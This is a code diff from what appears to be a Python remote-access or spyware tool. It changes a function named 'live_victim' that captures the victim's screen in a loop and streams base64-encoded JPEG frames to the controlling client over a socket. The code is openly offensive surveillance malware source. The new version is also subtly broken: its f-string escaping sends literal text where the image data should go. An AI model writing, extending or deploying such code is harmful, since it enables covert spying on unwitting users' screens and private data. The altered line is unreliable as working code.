@@ -51,15 +51,13 @@ banner = r"""
 def live_victim(client_socket):
     try:
         while True:
-            screenshot = ImageGrab.grab()
-            if screenshot.mode == "RGBA":
-                screenshot = screenshot.convert("RGB")
-            buffer = io.BytesIO()
-            screenshot.save(buffer, format="JPEG", quality=30)
-            buffer.seek(0)
-            b64_data = base64.b64encode(buffer.read()).decode()
-            frame_data = f"LIVE_START\n{b64_data}\nLIVE_END"
-            client_socket.send(frame_data.encode())
+            ss = ImageGrab.grab()
+            if ss.mode == "RGBA":
+                ss = ss.convert("RGB")
+            b = io.BytesIO()
+            ss.save(b, format="JPEG", quality=30)
+            b64 = base64.b64encode(b.getvalue()).decode()
+            client_socket.send(f"LIVE_START\\n{{b64}}\\nLIVE_END".encode())
             time.sleep(0.3)
     except Exception as e:
         print(f"[VICTIM] Screen streaming error: {e}")
